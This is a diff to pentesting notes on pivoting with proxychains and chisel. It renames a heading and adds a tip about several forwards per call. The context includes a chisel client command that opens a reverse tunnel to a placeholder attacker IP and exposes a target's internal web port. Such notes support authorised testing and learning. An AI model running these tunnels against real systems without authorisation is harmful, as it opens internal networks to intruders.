@@ -48,7 +48,7 @@ socks5 127.0.0.1 1080
 proxychains4 -f proxychains4.conf ${SOME_COMMAND} 
 ```
 
-## Local port forward with chisel
+## Remote port forward with chisel
 
 if you want to expose a single port on an owned machine `IP0`, you can do:
 
@@ -64,3 +64,6 @@ For exposing a local port on a machine do:
 ./chisel client ${ATTACKER_IP}:3333 R:9000:127.0.0.1:8000
 ```
 Now, you can access the website internally exposed on `127.0.0.1:8000` on the target machine by going to `localhost:9000` in firefox.
+
+Note that you can do multiple port forwarding statements with one client call.
+In case you need to forward multiple ports.
